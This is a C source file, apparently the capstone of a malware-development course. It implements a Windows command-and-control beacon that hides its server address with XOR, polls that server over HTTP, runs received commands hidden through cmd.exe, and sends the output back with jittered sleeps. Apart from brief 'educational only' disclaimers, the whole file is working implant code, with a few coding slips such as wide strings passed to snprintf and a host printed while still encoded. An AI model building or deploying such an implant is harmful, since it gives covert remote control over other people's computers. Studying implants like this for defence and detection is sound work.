/*
 * Final Beacon - Complete C2 Implant
 *
 * This is the culmination of the C Maldev Journey course.
 * A complete, educational beacon with:
 * - HTTP C2 communication
 * - Command execution
 * - Sleep/Jitter
 * - Basic obfuscation
 * - Clean architecture
 *
 * FOR EDUCATIONAL PURPOSES ONLY
 * Use only in authorized environments
 */

#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "winhttp.lib")

// Beacon configuration
#define BEACON_SLEEP    5000        // 5 seconds
#define BEACON_JITTER   30          // 30% jitter
#define MAX_OUTPUT      8192        // 8KB output buffer
#define XOR_KEY         0x42        // XOR obfuscation key

// Obfuscated C2 configuration (XOR with 0x42)
static CHAR g_C2Host[] = {
    'l' ^ XOR_KEY, 'o' ^ XOR_KEY, 'c' ^ XOR_KEY, 'a' ^ XOR_KEY,
    'l' ^ XOR_KEY, 'h' ^ XOR_KEY, 'o' ^ XOR_KEY, 's' ^ XOR_KEY,
    't' ^ XOR_KEY, '\0'
};
static WORD g_C2Port = 8080;
static CHAR g_CheckinPath[] = "/beacon/checkin";
static CHAR g_TaskPath[] = "/beacon/task";
static CHAR g_ResultPath[] = "/beacon/result";

// Beacon state
typedef struct {
    CHAR beaconId[64];
    BOOL running;
    DWORD sleepTime;
    DWORD jitter;
} BEACON_STATE;

static BEACON_STATE g_State = {0};

/*
 * XOR encrypt/decrypt string
 */
VOID XorString(CHAR* str, SIZE_T len) {
    for (SIZE_T i = 0; i < len; i++) {
        str[i] ^= XOR_KEY;
    }
}

/*
 * Calculate sleep with jitter
 * Returns sleep time with random jitter applied
 */
DWORD CalculateJitterSleep(DWORD baseTime, DWORD jitterPercent) {
    if (jitterPercent == 0) return baseTime;
    if (jitterPercent > 100) jitterPercent = 100;

    DWORD jitterRange = (baseTime * jitterPercent) / 100;
    DWORD jitter = rand() % (jitterRange * 2) - jitterRange;

    return baseTime + jitter;
}

/*
 * Generate beacon ID
 */
VOID GenerateBeaconId(CHAR* buffer, SIZE_T bufferSize) {
    CHAR computerName[256];
    DWORD nameSize = sizeof(computerName);
    GetComputerNameA(computerName, &nameSize);

    DWORD pid = GetCurrentProcessId();

    snprintf(buffer, bufferSize, "%s_%u_%u",
             computerName, pid, GetTickCount());
}

/*
 * Execute command and capture output
 */
BOOL ExecuteCommand(const CHAR* command, CHAR* output, DWORD outputSize) {
    SECURITY_ATTRIBUTES sa = {0};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    HANDLE hReadPipe, hWritePipe;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        return FALSE;
    }

    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {0};

    CHAR cmdLine[1024];
    snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /c %s", command);

    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return FALSE;
    }

    CloseHandle(hWritePipe);

    DWORD totalRead = 0;
    DWORD bytesRead;
    CHAR buffer[4096];

    while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        if (totalRead + bytesRead >= outputSize - 1) {
            bytesRead = outputSize - totalRead - 1;
        }
        memcpy(output + totalRead, buffer, bytesRead);
        totalRead += bytesRead;

        if (totalRead >= outputSize - 1) break;
    }

    output[totalRead] = '\0';

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hReadPipe);

    return TRUE;
}

/*
 * HTTP GET request
 */
BOOL HttpGet(const WCHAR* host, WORD port, const WCHAR* path,
             CHAR* response, DWORD responseSize) {
    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    if (!hSession) return FALSE;

    HINTERNET hConnect = WinHttpConnect(hSession, host, port, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, L"GET", path,
        NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0
    );

    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    BOOL result = WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0,
        0, 0
    );

    if (result) {
        result = WinHttpReceiveResponse(hRequest, NULL);
    }

    if (result) {
        DWORD bytesRead = 0;
        result = WinHttpReadData(hRequest, response, responseSize - 1, &bytesRead);
        response[bytesRead] = '\0';
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return result;
}

/*
 * HTTP POST request
 */
BOOL HttpPost(const WCHAR* host, WORD port, const WCHAR* path,
              const CHAR* data, DWORD dataSize) {
    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    if (!hSession) return FALSE;

    HINTERNET hConnect = WinHttpConnect(hSession, host, port, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, L"POST", path,
        NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0
    );

    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    LPCWSTR headers = L"Content-Type: text/plain\r\n";

    BOOL result = WinHttpSendRequest(
        hRequest,
        headers, -1,
        (LPVOID)data, dataSize,
        dataSize, 0
    );

    if (result) {
        result = WinHttpReceiveResponse(hRequest, NULL);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return result;
}

/*
 * Process command from C2
 */
VOID ProcessCommand(const CHAR* command, CHAR* result, DWORD resultSize) {
    if (strncmp(command, "exit", 4) == 0) {
        snprintf(result, resultSize, "[+] Beacon exiting");
        g_State.running = FALSE;
        return;
    }

    if (strncmp(command, "sleep ", 6) == 0) {
        DWORD newSleep = atoi(command + 6);
        g_State.sleepTime = newSleep * 1000;
        snprintf(result, resultSize, "[+] Sleep updated to %u seconds", newSleep);
        return;
    }

    if (strncmp(command, "jitter ", 7) == 0) {
        DWORD newJitter = atoi(command + 7);
        g_State.jitter = newJitter;
        snprintf(result, resultSize, "[+] Jitter updated to %u%%", newJitter);
        return;
    }

    // Execute as shell command
    if (!ExecuteCommand(command, result, resultSize)) {
        snprintf(result, resultSize, "[-] Failed to execute command");
    }
}

/*
 * Main beacon loop
 */
VOID BeaconLoop(void) {
    // Deobfuscate C2 host
    XorString(g_C2Host, strlen(g_C2Host));

    WCHAR wHost[256];
    MultiByteToWideChar(CP_ACP, 0, g_C2Host, -1, wHost, 256);

    WCHAR wCheckinPath[256];
    MultiByteToWideChar(CP_ACP, 0, g_CheckinPath, -1, wCheckinPath, 256);

    WCHAR wTaskPath[512];
    WCHAR wResultPath[512];

    // Initial check-in
    CHAR checkinData[512];
    snprintf(checkinData, sizeof(checkinData),
             "id=%s&computer=%s&user=%s&pid=%u",
             g_State.beaconId, "COMPUTER", "USER", GetCurrentProcessId());

    printf("[*] Initial check-in: %s\n", checkinData);

    // Main loop
    while (g_State.running) {
        // Get task from C2
        snprintf(wTaskPath, 512, L"%S?id=%S", g_TaskPath, g_State.beaconId);

        CHAR taskBuffer[4096];
        memset(taskBuffer, 0, sizeof(taskBuffer));

        if (HttpGet(wHost, g_C2Port, wTaskPath, taskBuffer, sizeof(taskBuffer))) {
            if (strlen(taskBuffer) > 0 && strcmp(taskBuffer, "none") != 0) {
                printf("[+] Task received: %s\n", taskBuffer);

                // Execute command
                CHAR output[MAX_OUTPUT];
                memset(output, 0, sizeof(output));
                ProcessCommand(taskBuffer, output, sizeof(output));

                printf("[*] Output (%zu bytes):\n%s\n", strlen(output), output);

                // Send result
                snprintf(wResultPath, 512, L"%S?id=%S", g_ResultPath, g_State.beaconId);
                HttpPost(wHost, g_C2Port, wResultPath, output, strlen(output));
            }
        }

        // Sleep with jitter
        DWORD sleepTime = CalculateJitterSleep(g_State.sleepTime, g_State.jitter);
        printf("[*] Sleeping for %u ms\n", sleepTime);
        Sleep(sleepTime);
    }

    printf("[*] Beacon exiting\n");
}

/*
 * Entry point
 */
int main(void) {
    printf("[*] Final Beacon - C2 Implant\n");
    printf("[*] Educational purposes only\n\n");

    // Initialize state
    GenerateBeaconId(g_State.beaconId, sizeof(g_State.beaconId));
    g_State.running = TRUE;
    g_State.sleepTime = BEACON_SLEEP;
    g_State.jitter = BEACON_JITTER;

    printf("[*] Beacon ID: %s\n", g_State.beaconId);
    printf("[*] C2: %s:%u\n", g_C2Host, g_C2Port);
    printf("[*] Sleep: %u ms\n", g_State.sleepTime);
    printf("[*] Jitter: %u%%\n\n", g_State.jitter);

    // Seed random for jitter
    srand(GetTickCount());

    // Run beacon
    BeaconLoop();

    return 0;
}
